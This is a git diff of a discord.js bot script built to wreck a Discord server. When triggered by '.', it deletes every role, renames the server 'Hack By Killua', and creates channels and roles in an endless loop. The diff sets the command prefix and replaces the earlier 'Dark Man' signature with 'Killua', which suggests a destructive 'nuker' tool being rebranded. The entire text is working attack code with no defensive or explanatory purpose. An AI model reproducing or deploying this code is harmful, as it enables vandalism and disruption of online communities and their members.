@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = ""; 
+const prefix = "."; 
 client.on("message", message => {
   if (message.content === ".") {
     if (message.channel.guild) {
@@ -15,11 +15,11 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Hack By Dark Man");
+      message.guild.setName("Hack By Killua");
       setInterval(function() {
-        message.guild.createChannel("By Dark Man", "voice");
-        message.guild.createChannel("By Dark Man", "text");
-        message.guild.createRole({ name: "By Dark Man" });
+        message.guild.createChannel("By Killua", "voice");
+        message.guild.createChannel("By Killua", "text");
+        message.guild.createRole({ name: "By Killua" });
       });
     }
   }
